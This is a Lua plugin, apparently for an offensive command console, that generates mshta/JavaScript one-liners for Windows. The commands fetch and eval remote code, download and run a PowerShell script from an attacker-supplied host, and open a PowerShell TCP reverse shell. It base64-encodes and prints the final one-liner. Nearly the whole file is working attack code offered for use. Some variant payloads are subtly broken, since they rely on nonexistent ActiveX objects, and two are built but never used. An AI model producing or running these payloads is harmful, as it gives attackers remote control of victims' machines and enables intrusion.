-- Plugin: lolbas_mshta_reverse_shell - Ejecuta reverse shell vía mshta + JavaScript
-- Uso: set lhost 192.168.1.10; set lport 4444; lolbas_mshta_reverse_shell

register_command("lolbas_mshta_reverse_shell", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then
        return "Error: lhost and lport required. Use 'set lhost x.x.x.x; set lport 4444'"
    end

    local js_payload = string.format([[
mshta javascript:a=new%%20ActiveXObject("WSXMLHTTP");a.Open("GET","http://%s:%s/connect",false);a.Send();if(a.Status==200){eval(a.ResponseText);}
]], lhost, lport)

    local cmd = string.format([[
mshta javascript:a=new%%20ActiveXObject("Socket");a.open("tcp","%s",%s);while(a.read(-1)==''){a.write('powershell -nop -c iex(iwr http://%s/shell.ps1)');}a.close();
]], lhost, lport, lhost)

    -- One-liner más realista
    local oneliner = string.format([==[
mshta javascript:var s=new ActiveXObject("WScript.Shell");s.Run("powershell -nop -c $c=New-Object Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=iex $d 2>&1;$s.Write($e,0,$e.Length);};");close()
]==], lhost, lport)

    app.one_cmd("encodewinbase64 " .. oneliner)

    print("\n[🔥] One-liner (mshta reverse shell):")
    print("\n" .. oneliner .. "\n")

    return "✅ lolbas_mshta_reverse_shell ready."
end)